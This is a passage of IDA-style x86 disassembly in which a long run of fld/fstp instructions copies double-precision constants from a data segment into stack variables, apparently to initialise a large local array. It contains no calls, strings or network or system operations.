		fstp	[ebp+var_2668]
		fld	ds:dbl_4249F0
		fstp	[ebp+var_2660]
		fld	ds:dbl_4249A0
		fstp	[ebp+var_2658]
		fld	ds:dbl_424BA0
		fstp	[ebp+var_2650]
		fld	ds:dbl_424BC0
		fstp	[ebp+var_2648]
		fld	ds:dbl_424A80
		fstp	[ebp+var_2640]
		fld	ds:dbl_424998
		fstp	[ebp+var_2638]
		fld	ds:dbl_424A30
		fstp	[ebp+var_2630]
		fld	ds:dbl_424998
		fstp	[ebp+var_2628]
		fld	ds:dbl_424990
		fstp	[ebp+var_2620]
		fld	ds:dbl_424988
		fstp	[ebp+var_2618]
		fld	ds:dbl_424BC8
		fstp	[ebp+var_2610]
		fld	ds:dbl_424980
		fstp	[ebp+var_2608]
		fld	ds:dbl_424978
		fstp	[ebp+var_2600]
		fld	ds:dbl_424970
		fstp	[ebp+var_25F8]
		fld	ds:dbl_424BB8
		fstp	[ebp+var_25F0]
		fld	ds:dbl_424968
		fstp	[ebp+var_25E8]
		fld	ds:dbl_424960
		fstp	[ebp+var_25E0]
		fld	ds:dbl_424958
		fstp	[ebp+var_25D8]
		fld	ds:dbl_424950
		fstp	[ebp+var_25D0]
		fld	ds:dbl_424948
		fstp	[ebp+var_25C8]
		fld	ds:dbl_424940
		fstp	[ebp+var_25C0]
		fld	ds:dbl_424A60
		fstp	[ebp+var_25B8]
		fld	ds:dbl_424A48
		fstp	[ebp+var_25B0]
		fld	ds:dbl_424938
		fstp	[ebp+var_25A8]
		fld	ds:dbl_424930
		fstp	[ebp+var_25A0]
		fld	ds:dbl_424928
		fstp	[ebp+var_2598]
		fld	ds:dbl_424B18
		fstp	[ebp+var_2590]
		fld	ds:dbl_424B80
		fstp	[ebp+var_2588]
		fld	ds:dbl_424920
		fstp	[ebp+var_2580]
		fld	ds:dbl_424918
		fstp	[ebp+var_2578]
		fld	ds:dbl_424910
		fstp	[ebp+var_2570]
		fld	ds:dbl_424A10
		fstp	[ebp+var_2568]
		fld	ds:dbl_424908
		fstp	[ebp+var_2560]
		fld	ds:dbl_424B00
		fstp	[ebp+var_2558]
		fld	ds:dbl_424A48
		fstp	[ebp+var_2550]
		fld	ds:dbl_424980
		fstp	[ebp+var_2548]
		fld	ds:dbl_424900
		fstp	[ebp+var_2540]
		fld	ds:dbl_4248F8
		fstp	[ebp+var_2538]
		fld	ds:dbl_424C08
		fstp	[ebp+var_2530]
		fld	ds:dbl_4248F0
		fstp	[ebp+var_2528]
		fld	ds:dbl_4248E8
		fstp	[ebp+var_2520]
		fld	ds:dbl_424C00
		fstp	[ebp+var_2518]
		fld	ds:dbl_4248E0
		fstp	[ebp+var_2510]
		fld	ds:dbl_424A18
		fstp	[ebp+var_2508]
		fld	ds:dbl_424A70
		fstp	[ebp+var_2500]
		fld	ds:dbl_4248D8
		fstp	[ebp+var_24F8]
		fld	ds:dbl_424910
		fstp	[ebp+var_24F0]
		fld	ds:dbl_4248D0
		fstp	[ebp+var_24E8]
		fld	ds:dbl_4248C8
		fstp	[ebp+var_24E0]
		fld	ds:dbl_424950
		fstp	[ebp+var_24D8]
		fld	ds:dbl_4249B0
		fstp	[ebp+var_24D0]
		fld	ds:dbl_4248C0
		fstp	[ebp+var_24C8]
		fld	ds:dbl_4248B8
		fstp	[ebp+var_24C0]
		fld	ds:dbl_4248B0
		fstp	[ebp+var_24B8]
		fld	ds:dbl_424AE0
		fstp	[ebp+var_24B0]
		fld	ds:dbl_4248A8
		fstp	[ebp+var_24A8]
		fld	ds:dbl_4248A0
		fstp	[ebp+var_24A0]
		fld	ds:dbl_424BA8
		fstp	[ebp+var_2498]
		fld	ds:dbl_4249B0
		fstp	[ebp+var_2490]
		fld	ds:dbl_424898
		fstp	[ebp+var_2488]
		fld	ds:dbl_424890
		fstp	[ebp+var_2480]
		fld	ds:dbl_424888
		fstp	[ebp+var_2478]
		fld	ds:dbl_424880
		fstp	[ebp+var_2470]
		fld	ds:dbl_424A20
		fstp	[ebp+var_2468]
		fld	ds:dbl_4248E8
		fstp	[ebp+var_2460]
		fld	ds:dbl_424878
		fstp	[ebp+var_2458]
		fld	ds:dbl_424870
		fstp	[ebp+var_2450]
		fld	ds:dbl_424868
		fstp	[ebp+var_2448]
		fld	ds:dbl_424A68
		fstp	[ebp+var_2440]
		fld	ds:dbl_424860
		fstp	[ebp+var_2438]
		fld	ds:dbl_424858
		fstp	[ebp+var_2430]
		fld	ds:dbl_424B60
		fstp	[ebp+var_2428]
		fld	ds:dbl_424A58
		fstp	[ebp+var_2420]
		fld	ds:dbl_424850
		fstp	[ebp+var_2418]
		fld	ds:dbl_424A18
		fstp	[ebp+var_2410]
		fld	ds:dbl_424848
		fstp	[ebp+var_2408]
		fld	ds:dbl_424840
		fstp	[ebp+var_2400]
		fld	ds:dbl_424B90
		fstp	[ebp+var_23F8]
		fld	ds:dbl_424838
		fstp	[ebp+var_23F0]
		fld	ds:dbl_424830
		fstp	[ebp+var_23E8]
		fld	ds:dbl_4249B8
		fstp	[ebp+var_23E0]
		fld	ds:dbl_4248F0
		fstp	[ebp+var_23D8]
		fld	ds:dbl_424BF0
		fstp	[ebp+var_23D0]
		fld	ds:dbl_424828
		fstp	[ebp+var_23C8]
		fld	ds:dbl_424820
		fstp	[ebp+var_23C0]
		fld	ds:dbl_4248D8
		fstp	[ebp+var_23B8]
		fld	ds:dbl_424A68
		fstp	[ebp+var_23B0]
		fld	ds:dbl_4248E0
		fstp	[ebp+var_23A8]
		fld	ds:dbl_424BA0
		fstp	[ebp+var_23A0]
		fld	ds:dbl_424960
		fstp	[ebp+var_2398]
		fld	ds:dbl_424818
		fstp	[ebp+var_2390]
		fld	ds:dbl_424B98
		fstp	[ebp+var_2388]
		fld	ds:dbl_4248D0
		fstp	[ebp+var_2380]
		fld	ds:dbl_424810
		fstp	[ebp+var_2378]
		fld	ds:dbl_424808
		fstp	[ebp+var_2370]
		fld	ds:dbl_424800
		fstp	[ebp+var_2368]
		fld	ds:dbl_4247F8
		fstp	[ebp+var_2360]
		fld	ds:dbl_4248B8
		fstp	[ebp+var_2358]
		fld	ds:dbl_4248D0
		fstp	[ebp+var_2350]
		fld	ds:dbl_4247F0
		fstp	[ebp+var_2348]
		fld	ds:dbl_4247E8
		fstp	[ebp+var_2340]
		fld	ds:dbl_4247E0
		fstp	[ebp+var_2338]
		fld	ds:dbl_424B98
		fstp	[ebp+var_2330]
		fld	ds:dbl_424888
		fstp	[ebp+var_2328]
		fld	ds:dbl_4247F0
		fstp	[ebp+var_2320]
		fld	ds:dbl_424810
		fstp	[ebp+var_2318]
		fld	ds:dbl_4247D8
		fstp	[ebp+var_2310]
		fld	ds:dbl_4247D0
		fstp	[ebp+var_2308]
		fld	ds:dbl_424850
		fstp	[ebp+var_2300]
		fld	ds:dbl_4248E0
		fstp	[ebp+var_22F8]
		fld	ds:dbl_424AE0
		fstp	[ebp+var_22F0]
		fld	ds:dbl_424B58
		fstp	[ebp+var_22E8]
		fld	ds:dbl_424BF0
		fstp	[ebp+var_22E0]
		fld	ds:dbl_4247C8
		fstp	[ebp+var_22D8]
		fld	ds:dbl_424BA8
		fstp	[ebp+var_22D0]
		fld	ds:dbl_4247C0
		fstp	[ebp+var_22C8]
		fld	ds:dbl_424B00
		fstp	[ebp+var_22C0]
		fld	ds:dbl_424BF0
		fstp	[ebp+var_22B8]
		fld	ds:dbl_424928
		fstp	[ebp+var_22B0]
		fld	ds:dbl_424968
		fstp	[ebp+var_22A8]
		fld	ds:dbl_424B58
		fstp	[ebp+var_22A0]
		fld	ds:dbl_4247B8
		fstp	[ebp+var_2298]
		fld	ds:dbl_424890
		fstp	[ebp+var_2290]
		fld	ds:dbl_424940
		fstp	[ebp+var_2288]
		fld	ds:dbl_4247B0
		fstp	[ebp+var_2280]
		fld	ds:dbl_4249C0
		fstp	[ebp+var_2278]
		fld	ds:dbl_424A40
		fstp	[ebp+var_2270]
		fld	ds:dbl_4247A8
		fstp	[ebp+var_2268]
		fld	ds:dbl_4247A0
		fstp	[ebp+var_2260]
		fld	ds:dbl_424A60
		fstp	[ebp+var_2258]
		fld	ds:dbl_424798
		fstp	[ebp+var_2250]
		fld	ds:dbl_424898
		fstp	[ebp+var_2248]
		fld	ds:dbl_4249B0
		fstp	[ebp+var_2240]
		fld	ds:dbl_424A60
		fstp	[ebp+var_2238]
		fld	ds:dbl_424790
		fstp	[ebp+var_2230]
		fld	ds:dbl_424788
		fstp	[ebp+var_2228]
		fld	ds:dbl_424830
		fstp	[ebp+var_2220]
		fld	ds:dbl_424780
		fstp	[ebp+var_2218]
		fld	ds:dbl_424B80
		fstp	[ebp+var_2210]
		fld	ds:dbl_424778
		fstp	[ebp+var_2208]
		fld	ds:dbl_424770
		fstp	[ebp+var_2200]
		fld	ds:dbl_4247B8
		fstp	[ebp+var_21F8]
		fld	ds:dbl_424768
		fstp	[ebp+var_21F0]
		fld	ds:dbl_424760
		fstp	[ebp+var_21E8]
		fld	ds:dbl_4249E0
		fstp	[ebp+var_21E0]
		fld	ds:dbl_424948
		fstp	[ebp+var_21D8]
		fld	ds:dbl_424A70
		fstp	[ebp+var_21D0]
		fld	ds:dbl_424758
		fstp	[ebp+var_21C8]
		fld	ds:dbl_4247F0
		fstp	[ebp+var_21C0]
		fld	ds:dbl_424750
		fstp	[ebp+var_21B8]
		fld	ds:dbl_424748
		fstp	[ebp+var_21B0]
		fld	ds:dbl_4248B8
		fstp	[ebp+var_21A8]
		fld	ds:dbl_424B38
		fstp	[ebp+var_21A0]
		fld	ds:dbl_424740
		fstp	[ebp+var_2198]
		fld	ds:dbl_424738
		fstp	[ebp+var_2190]
		fld	ds:dbl_424730
		fstp	[ebp+var_2188]
		fld	ds:dbl_424728
		fstp	[ebp+var_2180]
		fld	ds:dbl_4248B0
		fstp	[ebp+var_2178]
		fld	ds:dbl_424B28
		fstp	[ebp+var_2170]
		fld	ds:dbl_424720
		fstp	[ebp+var_2168]
		fld	ds:dbl_424938
		fstp	[ebp+var_2160]
		fld	ds:dbl_4247C0
		fstp	[ebp+var_2158]
		fld	ds:dbl_424978
		fstp	[ebp+var_2150]
		fld	ds:dbl_424718
		fstp	[ebp+var_2148]
		fld	ds:dbl_424710
		fstp	[ebp+var_2140]
		fld	ds:dbl_424708
		fstp	[ebp+var_2138]
		fld	ds:dbl_424740
		fstp	[ebp+var_2130]
		fld	ds:dbl_424700
		fstp	[ebp+var_2128]
		fld	ds:dbl_4247F8
		fstp	[ebp+var_2120]
		fld	ds:dbl_424878
		fstp	[ebp+var_2118]
		fld	ds:dbl_4246F8
		fstp	[ebp+var_2110]
		fld	ds:dbl_424A80
		fstp	[ebp+var_2108]
		fld	ds:dbl_424A08
		fstp	[ebp+var_2100]
		fld	ds:dbl_4248C0
		fstp	[ebp+var_20F8]
		fld	ds:dbl_4246F0
		fstp	[ebp+var_20F0]
		fld	ds:dbl_424B10
		fstp	[ebp+var_20E8]
		fld	ds:dbl_424820
		fstp	[ebp+var_20E0]
		fld	ds:dbl_424710
		fstp	[ebp+var_20D8]
		fld	ds:dbl_4246E8
		fstp	[ebp+var_20D0]
		fld	ds:dbl_424840
		fstp	[ebp+var_20C8]
		fld	ds:dbl_424A08
		fstp	[ebp+var_20C0]
		fld	ds:dbl_4247D8
		fstp	[ebp+var_20B8]
		fld	ds:dbl_424B98
		fstp	[ebp+var_20B0]
		fld	ds:dbl_424B90
		fstp	[ebp+var_20A8]
		fld	ds:dbl_4246E0
		fstp	[ebp+var_20A0]
		fld	ds:dbl_424A88
		fstp	[ebp+var_2098]
		fld	ds:dbl_4249E8
		fstp	[ebp+var_2090]
		fld	ds:dbl_424AF0
		fstp	[ebp+var_2088]
		fld	ds:dbl_4246D8
		fstp	[ebp+var_2080]
		fld	ds:dbl_424930
		fstp	[ebp+var_2078]
		fld	ds:dbl_424BB0
		fstp	[ebp+var_2070]
		fld	ds:dbl_4246D0
		fstp	[ebp+var_2068]
		fld	ds:dbl_424820
		fstp	[ebp+var_2060]
		fld	ds:dbl_424898
		fstp	[ebp+var_2058]
		fld	ds:dbl_424B18
		fstp	[ebp+var_2050]
		fld	ds:dbl_424A88
		fstp	[ebp+var_2048]
		fld	ds:dbl_424830
		fstp	[ebp+var_2040]
		fld	ds:dbl_424B70
		fstp	[ebp+var_2038]
		fld	ds:dbl_424988
		fstp	[ebp+var_2030]
		fld	ds:dbl_424A50
		fstp	[ebp+var_2028]
		fld1
		fstp	[ebp+var_2020]
		fld	ds:dbl_4246C0
		fstp	[ebp+var_2018]
		fld	ds:dbl_4249B8
		fstp	[ebp+var_2010]
		fld	ds:dbl_424AA8
		fstp	[ebp+var_2008]
		fld	ds:dbl_4246B8
		fstp	[ebp+var_2000]
		fld	ds:dbl_424A70
		fstp	[ebp+var_1FF8]
		fld	ds:dbl_424C10
		fstp	[ebp+var_1FF0]
		fld	ds:dbl_4246B0
		fstp	[ebp+var_1FE8]
		fld	ds:dbl_4246A8
		fstp	[ebp+var_1FE0]
		fld	ds:dbl_4247A0
		fstp	[ebp+var_1FD8]
		fld	ds:dbl_424930
		fstp	[ebp+var_1FD0]
		fld	ds:dbl_424B38
		fstp	[ebp+var_1FC8]
		fld	ds:dbl_4247B8
		fstp	[ebp+var_1FC0]
		fld	ds:dbl_424BF0
		fstp	[ebp+var_1FB8]
		fld	ds:dbl_4246A0
		fstp	[ebp+var_1FB0]
		fld	ds:dbl_424698
		fstp	[ebp+var_1FA8]
		fld	ds:dbl_424690
		fstp	[ebp+var_1FA0]
		fld	ds:dbl_424688
		fstp	[ebp+var_1F98]
		fld	ds:dbl_424730
		fstp	[ebp+var_1F90]
		fld	ds:dbl_424958
		fstp	[ebp+var_1F88]
		fld	ds:dbl_424680
		fstp	[ebp+var_1F80]
		fld	ds:dbl_424678
		fstp	[ebp+var_1F78]
		fld	ds:dbl_424AD0
		fstp	[ebp+var_1F70]
		fld	ds:dbl_4248A0
		fstp	[ebp+var_1F68]
		fld	ds:dbl_4248F8
		fstp	[ebp+var_1F60]
		fld	ds:dbl_424B00
		fstp	[ebp+var_1F58]
		fld	ds:dbl_424828
		fstp	[ebp+var_1F50]
		fld	ds:dbl_424930
		fstp	[ebp+var_1F48]
		fld	ds:dbl_424890
		fstp	[ebp+var_1F40]
		fld	ds:dbl_424670
		fstp	[ebp+var_1F38]
		fld	ds:dbl_424668
		fstp	[ebp+var_1F30]
		fld	ds:dbl_424660
		fstp	[ebp+var_1F28]
		fld	ds:dbl_424658
		fstp	[ebp+var_1F20]
		fld	ds:dbl_424980
		fstp	[ebp+var_1F18]
		fld	ds:dbl_424750
		fstp	[ebp+var_1F10]
		fld	ds:dbl_424650
		fstp	[ebp+var_1F08]
		fld	ds:dbl_424A40
		fstp	[ebp+var_1F00]
		fld	ds:dbl_424648
		fstp	[ebp+var_1EF8]
		fld	ds:dbl_424B70
		fstp	[ebp+var_1EF0]
		fld	ds:dbl_424640
		fstp	[ebp+var_1EE8]
		fld	ds:dbl_424B18
		fstp	[ebp+var_1EE0]
		fld	ds:dbl_424638
		fstp	[ebp+var_1ED8]
		fld	ds:dbl_424BA0
		fstp	[ebp+var_1ED0]
		fld	ds:dbl_424630
		fstp	[ebp+var_1EC8]
		fld	ds:dbl_424B20
		fstp	[ebp+var_1EC0]
		fld	ds:dbl_424BC0
		fstp	[ebp+var_1EB8]
		fld	ds:dbl_424808
		fstp	[ebp+var_1EB0]
		fld	ds:dbl_424AE0
		fstp	[ebp+var_1EA8]
		fld	ds:dbl_4247A0
		fstp	[ebp+var_1EA0]
		fld	ds:dbl_424628
		fstp	[ebp+var_1E98]
		fld	ds:dbl_424A20
		fstp	[ebp+var_1E90]
		fld	ds:dbl_424630
		fstp	[ebp+var_1E88]
		fld	ds:dbl_424880
		fstp	[ebp+var_1E80]
		fld	ds:dbl_424620
		fstp	[ebp+var_1E78]
		fld	ds:dbl_4247A8
		fstp	[ebp+var_1E70]
		fld	ds:dbl_424618
		fstp	[ebp+var_1E68]
		fld	ds:dbl_424BE0
		fstp	[ebp+var_1E60]
		fld	ds:dbl_424668
		fstp	[ebp+var_1E58]
		fld	ds:dbl_424610
		fstp	[ebp+var_1E50]
		fld	ds:dbl_424608
		fstp	[ebp+var_1E48]
		fld	ds:dbl_424BE0
		fstp	[ebp+var_1E40]
		fld	ds:dbl_424A38
		fstp	[ebp+var_1E38]
		fld	ds:dbl_424928
		fstp	[ebp+var_1E30]
		fld	ds:dbl_424600
		fstp	[ebp+var_1E28]
		fld	ds:dbl_424748
		fstp	[ebp+var_1E20]
		fld	ds:dbl_4245F8
		fstp	[ebp+var_1E18]
		fld	ds:dbl_4245F0
		fstp	[ebp+var_1E10]
		fld	ds:dbl_424AE0
		fstp	[ebp+var_1E08]
		fld	ds:dbl_424A18
		fstp	[ebp+var_1E00]
		fld	ds:dbl_424990
		fstp	[ebp+var_1DF8]
		fld	ds:dbl_424B88
		fstp	[ebp+var_1DF0]
		fld	ds:dbl_424738
		fstp	[ebp+var_1DE8]
		fld	ds:dbl_4248F0
		fstp	[ebp+var_1DE0]
		fld	ds:dbl_4247B8
		fstp	[ebp+var_1DD8]
		fld	ds:dbl_424920
		fstp	[ebp+var_1DD0]
		fld	ds:dbl_4249B8
		fstp	[ebp+var_1DC8]
		fld	ds:dbl_424790
		fstp	[ebp+var_1DC0]
		fld	ds:dbl_424958
		fstp	[ebp+var_1DB8]
		fld	ds:dbl_424970
		fstp	[ebp+var_1DB0]
		fld	ds:dbl_424A98
		fstp	[ebp+var_1DA8]
		fld	ds:dbl_424B88
		fstp	[ebp+var_1DA0]
		fld	ds:dbl_424720
		fstp	[ebp+var_1D98]
		fld	ds:dbl_424618
		fstp	[ebp+var_1D90]
		fld	ds:dbl_424768
		fstp	[ebp+var_1D88]
		fld	ds:dbl_424900
		fstp	[ebp+var_1D80]
		fld	ds:dbl_4247B8
		fstp	[ebp+var_1D78]
		fld	ds:dbl_4245E8
		fstp	[ebp+var_1D70]
		fld	ds:dbl_4245E0
		fstp	[ebp+var_1D68]
		fld	ds:dbl_4245D8
		fstp	[ebp+var_1D60]
		fld	ds:dbl_424B80
		fstp	[ebp+var_1D58]
		fld	ds:dbl_4245D0
		fstp	[ebp+var_1D50]
		fld	ds:dbl_4248C0
		fstp	[ebp+var_1D48]
		fld	ds:dbl_4246F8
		fstp	[ebp+var_1D40]
		fld	ds:dbl_4248D8
		fstp	[ebp+var_1D38]
		fld	ds:dbl_424B58
		fstp	[ebp+var_1D30]
		fld	ds:dbl_424868
		fstp	[ebp+var_1D28]
		fld	ds:dbl_4245C8
		fstp	[ebp+var_1D20]
		fld	ds:dbl_424BB8
		fstp	[ebp+var_1D18]
		fld	ds:dbl_4249C0
		fstp	[ebp+var_1D10]
		fld	ds:dbl_424A20
		fstp	[ebp+var_1D08]
		fld	ds:dbl_424B58
		fstp	[ebp+var_1D00]
		fld	ds:dbl_424BD0
		fstp	[ebp+var_1CF8]
		fld	ds:dbl_4245C0
		fstp	[ebp+var_1CF0]
		fld	ds:dbl_424648
		fstp	[ebp+var_1CE8]
		fld	ds:dbl_424748
		fstp	[ebp+var_1CE0]
		fld	ds:dbl_424A00
		fstp	[ebp+var_1CD8]
		fld	ds:dbl_424B58
		fstp	[ebp+var_1CD0]
		fld	ds:dbl_424A10
		fstp	[ebp+var_1CC8]
		fld	ds:dbl_424B98
		fstp	[ebp+var_1CC0]
		fld	ds:dbl_4249D8
		fstp	[ebp+var_1CB8]
		fld	ds:dbl_424B08
		fstp	[ebp+var_1CB0]
		fld	ds:dbl_424888
		fstp	[ebp+var_1CA8]
		fld	ds:dbl_4245B8
		fstp	[ebp+var_1CA0]
		fld	ds:dbl_424AD8
		fstp	[ebp+var_1C98]
		fld	ds:dbl_424A90
		fstp	[ebp+var_1C90]
		fld	ds:dbl_424B08
		fstp	[ebp+var_1C88]
		fld	ds:dbl_424858
		fstp	[ebp+var_1C80]
		fld	ds:dbl_424920
		fstp	[ebp+var_1C78]
		fld	ds:dbl_4246F0
		fstp	[ebp+var_1C70]
		fld	ds:dbl_4245B0
		fstp	[ebp+var_1C68]
		fld	ds:dbl_4245A8
		fstp	[ebp+var_1C60]
		fld	ds:dbl_424678
		fstp	[ebp+var_1C58]
		fld	ds:dbl_4245A0
		fstp	[ebp+var_1C50]
		fld	ds:dbl_424618
		fstp	[ebp+var_1C48]
		fld	ds:dbl_424A08
		fstp	[ebp+var_1C40]
		fld	ds:dbl_4246F8
		fstp	[ebp+var_1C38]
		fld	ds:dbl_424680
		fstp	[ebp+var_1C30]
		fld	ds:dbl_424808
		fstp	[ebp+var_1C28]
		fld	ds:dbl_4247B8
		fstp	[ebp+var_1C20]
		fld	ds:dbl_424598
		fstp	[ebp+var_1C18]
		fld	ds:dbl_424688
		fstp	[ebp+var_1C10]
		fld	ds:dbl_424918
		fstp	[ebp+var_1C08]
		fld	ds:dbl_424678
		fstp	[ebp+var_1C00]
		fld	ds:dbl_424898
		fstp	[ebp+var_1BF8]
		fld	ds:dbl_424A88
		fstp	[ebp+var_1BF0]
		fld	ds:dbl_4247B8
		fstp	[ebp+var_1BE8]
		fld	ds:dbl_424728
		fstp	[ebp+var_1BE0]
		fld	ds:dbl_424BA0
		fstp	[ebp+var_1BD8]
		fld	ds:dbl_424590
		fstp	[ebp+var_1BD0]
		fld	ds:dbl_424AD0
		fstp	[ebp+var_1BC8]
		fld	ds:dbl_4249D0
		fstp	[ebp+var_1BC0]
		fld	ds:dbl_424588
		fstp	[ebp+var_1BB8]
		fld	ds:dbl_424580
		fstp	[ebp+var_1BB0]
		fld	ds:dbl_4249A8
		fstp	[ebp+var_1BA8]
		fld	ds:dbl_424970
		fstp	[ebp+var_1BA0]
		fld	ds:dbl_424760
		fstp	[ebp+var_1B98]
		fld	ds:dbl_4245E8
		fstp	[ebp+var_1B90]
		fld	ds:dbl_424578
		fstp	[ebp+var_1B88]
		fld	ds:dbl_424688
		fstp	[ebp+var_1B80]
		fld	ds:dbl_4246E8
		fstp	[ebp+var_1B78]
		fld	ds:dbl_424688
		fstp	[ebp+var_1B70]
		fld	ds:dbl_424570
		fstp	[ebp+var_1B68]
		fld	ds:dbl_4247A0
		fstp	[ebp+var_1B60]
		fld	ds:dbl_4249C8
		fstp	[ebp+var_1B58]
		fld	ds:dbl_424740
		fstp	[ebp+var_1B50]
		fld	ds:dbl_424A10
		fstp	[ebp+var_1B48]
		fld	ds:dbl_424BB8
		fstp	[ebp+var_1B40]
		fld	ds:dbl_424778
		fstp	[ebp+var_1B38]
		fld	ds:dbl_424868
		fstp	[ebp+var_1B30]
		fld	ds:dbl_424568
		fstp	[ebp+var_1B28]
		fld	ds:dbl_424638
		fstp	[ebp+var_1B20]
		fld	ds:dbl_4248F0
		fstp	[ebp+var_1B18]
		fld	ds:dbl_424960
		fstp	[ebp+var_1B10]
		fld	ds:dbl_4249C0
		fstp	[ebp+var_1B08]
		fld	ds:dbl_424888
		fstp	[ebp+var_1B00]
		fld	ds:dbl_4246A8
		fstp	[ebp+var_1AF8]
		fld	ds:dbl_424BD0
		fstp	[ebp+var_1AF0]
		fld	ds:dbl_424560
		fstp	[ebp+var_1AE8]
		fld	ds:dbl_424598
		fstp	[ebp+var_1AE0]
		fld	ds:dbl_424B10
		fstp	[ebp+var_1AD8]
		fld	ds:dbl_424A40
		fstp	[ebp+var_1AD0]
		fld	ds:dbl_424B50
		fstp	[ebp+var_1AC8]
		fld	ds:dbl_424A70
		fstp	[ebp+var_1AC0]
		fld	ds:dbl_424B70
		fstp	[ebp+var_1AB8]
		fld	ds:dbl_424940
		fstp	[ebp+var_1AB0]
		fld	ds:dbl_424630
		fstp	[ebp+var_1AA8]
		fld	ds:dbl_424AE8
		fstp	[ebp+var_1AA0]
		fld	ds:dbl_424AE0
		fstp	[ebp+var_1A98]
		fld	ds:dbl_4246A8
		fstp	[ebp+var_1A90]
		fld	ds:dbl_424558
		fstp	[ebp+var_1A88]
		fld	ds:dbl_424550
		fstp	[ebp+var_1A80]
		fld	ds:dbl_424BA0
		fstp	[ebp+var_1A78]
		fld	ds:dbl_424A30
		fstp	[ebp+var_1A70]
		fld	ds:dbl_424B40
		fstp	[ebp+var_1A68]
		fld	ds:dbl_424678
		fstp	[ebp+var_1A60]
		fld	ds:dbl_424548
		fstp	[ebp+var_1A58]
		fld	ds:dbl_424BC8
		fstp	[ebp+var_1A50]
		fld	ds:dbl_424540
		fstp	[ebp+var_1A48]
		fld	ds:dbl_4249A0
		fstp	[ebp+var_1A40]
		fld	ds:dbl_4245C8
		fstp	[ebp+var_1A38]
		fld	ds:dbl_424AA0
		fstp	[ebp+var_1A30]
		fld	ds:dbl_4248D8
		fstp	[ebp+var_1A28]
		fld	ds:dbl_424600
		fstp	[ebp+var_1A20]
		fld	ds:dbl_4248D8
		fstp	[ebp+var_1A18]
		fld	ds:dbl_424A90
		fstp	[ebp+var_1A10]
		fld	ds:dbl_424B68
		fstp	[ebp+var_1A08]
		fld	ds:dbl_424538
		fstp	[ebp+var_1A00]
		fld	ds:dbl_424590
		fstp	[ebp+var_19F8]
		fld	ds:dbl_424938
		fstp	[ebp+var_19F0]
		fld	ds:dbl_424938
		fstp	[ebp+var_19E8]
		fld	ds:dbl_424580
		fstp	[ebp+var_19E0]
		fld	ds:dbl_424830
		fstp	[ebp+var_19D8]
		fld	ds:dbl_424940
		fstp	[ebp+var_19D0]
		fld	ds:dbl_424530
		fstp	[ebp+var_19C8]
		fld	ds:dbl_424848
		fstp	[ebp+var_19C0]
		fld	ds:dbl_424528
		fstp	[ebp+var_19B8]
		fld	ds:dbl_424A20
		fstp	[ebp+var_19B0]
		fld	ds:dbl_424A18
		fstp	[ebp+var_19A8]
		fld	ds:dbl_424990
		fstp	[ebp+var_19A0]
		fld	ds:dbl_424A78
		fstp	[ebp+var_1998]
		fld	ds:dbl_4247F8
		fstp	[ebp+var_1990]
		fld	ds:dbl_424520
		fstp	[ebp+var_1988]
		fld	ds:dbl_424AF0
		fstp	[ebp+var_1980]
		fld	ds:dbl_424B90
		fstp	[ebp+var_1978]
		fld	ds:dbl_424B80
		fstp	[ebp+var_1970]
		fld	ds:dbl_424B40
		fstp	[ebp+var_1968]
		fld	ds:dbl_424630
		fstp	[ebp+var_1960]
		fld	ds:dbl_424748
		fstp	[ebp+var_1958]
		fld	ds:dbl_4248E8
		fstp	[ebp+var_1950]
		fld	ds:dbl_424BC0
		fstp	[ebp+var_1948]
		fld	ds:dbl_424518
		fstp	[ebp+var_1940]
		fld	ds:dbl_424AC0
		fstp	[ebp+var_1938]
		fld	ds:dbl_424768
		fstp	[ebp+var_1930]
		fld	ds:dbl_424B30
		fstp	[ebp+var_1928]
		fld	ds:dbl_4247C0
		fstp	[ebp+var_1920]
		fld	ds:dbl_424BF8
		fstp	[ebp+var_1918]
		fld	ds:dbl_4246D0
		fstp	[ebp+var_1910]
		fld	ds:dbl_424A30
		fstp	[ebp+var_1908]
		fld	ds:dbl_4248B8
		fstp	[ebp+var_1900]
		fld	ds:dbl_4248C8
		fstp	[ebp+var_18F8]
		fld	ds:dbl_424650
		fstp	[ebp+var_18F0]
		fld	ds:dbl_424678
		fstp	[ebp+var_18E8]
		fld	ds:dbl_424630
		fstp	[ebp+var_18E0]
		fld	ds:dbl_424818
		fstp	[ebp+var_18D8]
		fld	ds:dbl_4246E8
		fstp	[ebp+var_18D0]
		fld	ds:dbl_424798
		fstp	[ebp+var_18C8]
		fld	ds:dbl_424558
		fstp	[ebp+var_18C0]
		fld	ds:dbl_4246F0
		fstp	[ebp+var_18B8]
		fld	ds:dbl_424580
		fstp	[ebp+var_18B0]
		fld	ds:dbl_424AE0
		fstp	[ebp+var_18A8]
		fld	ds:dbl_4248F8
		fstp	[ebp+var_18A0]
		fld	ds:dbl_4246D0
		fstp	[ebp+var_1898]
		fld	ds:dbl_424570
		fstp	[ebp+var_1890]
		fld1
		fstp	[ebp+var_1888]
		fld	ds:dbl_424908
		fstp	[ebp+var_1880]
		fld	ds:dbl_424B38
		fstp	[ebp+var_1878]
		fld	ds:dbl_424928
		fstp	[ebp+var_1870]
		fld	ds:dbl_424B70
		fstp	[ebp+var_1868]
		fld	ds:dbl_424620
		fstp	[ebp+var_1860]
		fld	ds:dbl_424690
		fstp	[ebp+var_1858]
		fld	ds:dbl_424830
		fstp	[ebp+var_1850]
		fld	ds:dbl_424B70
		fstp	[ebp+var_1848]
		fld	ds:dbl_424900
		fstp	[ebp+var_1840]
		fld	ds:dbl_424740
		fstp	[ebp+var_1838]
		fld	ds:dbl_424850
		fstp	[ebp+var_1830]
		fld	ds:dbl_4249A8
		fstp	[ebp+var_1828]
		fld	ds:dbl_424A58
		fstp	[ebp+var_1820]
		fld	ds:dbl_424650
		fstp	[ebp+var_1818]
		fld	ds:dbl_4246F8
		fstp	[ebp+var_1810]
		fld	ds:dbl_424510
		fstp	[ebp+var_1808]
		fld	ds:dbl_4249A0
		fstp	[ebp+var_1800]
		fld	ds:dbl_4247B0
		fstp	[ebp+var_17F8]
		fld1
		fstp	[ebp+var_17F0]
		fld	ds:dbl_424508
		fstp	[ebp+var_17E8]
		fld	ds:dbl_424790
		fstp	[ebp+var_17E0]
		fld	ds:dbl_424500
		fstp	[ebp+var_17D8]
		fld	ds:dbl_4244F8
		fstp	[ebp+var_17D0]
		fld	ds:dbl_424590
		fstp	[ebp+var_17C8]
		fld	ds:dbl_424BC0
		fstp	[ebp+var_17C0]
		fld	ds:dbl_424970
		fstp	[ebp+var_17B8]
		fld	ds:dbl_424720
		fstp	[ebp+var_17B0]
		fld	ds:dbl_424930
		fstp	[ebp+var_17A8]
		fld	ds:dbl_424B10
		fstp	[ebp+var_17A0]
		fld	ds:dbl_4244F0
